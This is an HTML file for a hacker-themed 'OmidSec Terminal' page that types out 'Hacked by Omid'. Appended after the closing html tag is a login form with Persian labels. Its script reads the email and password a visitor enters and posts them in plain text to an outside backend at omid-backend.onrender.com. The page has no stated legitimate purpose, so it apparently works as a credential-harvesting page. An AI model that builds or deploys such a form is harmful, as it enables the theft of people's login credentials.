<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OmidSec Terminal</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="overlay">
    <h1>⛓️ OmidSec Terminal</h1>
    <p id="line1" class="typewriter"></p>
    <p id="line2" class="typewriter"></p>
    <p id="line3" class="typewriter hacked"></p>
  </div>

  <script>
    const lines = [
      "Connecting to unknown networks...",
      "Access to database authorized ✅",
      "Hacked by Omid ⚡"
    ];

    function typeLine(id, text, delay) {
      setTimeout(() => {
        let i = 0;
        const interval = setInterval(() => {
          document.getElementById(id).textContent += text[i];
          i++;
          if (i === text.length) clearInterval(interval);
        }, 100);
      }, delay);
    }

    typeLine("line1", lines[0], 1000);
    typeLine("line2", lines[1], 4000);
    typeLine("line3", lines[2], 7000);
  </script>
</body>
</html>
<form id="login-form">
  <input type="email" id="email" placeholder="ایمیل" required />
  <input type="password" id="password" placeholder="پسورد" required />
  <button type="submit">ارسال</button>
</form>

<script>
  const ENDPOINT = "https://omid-backend.onrender.com/send"; // آدرس بک‌اندت روی Render

  document.getElementById("login-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    try {
      const res = await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: `Email: ${email}, Password: ${password}` })
      });
      const text = await res.text();
      alert(text);
    } catch (err) {
      alert("خطا در ارسال");
    }
  });
</script>
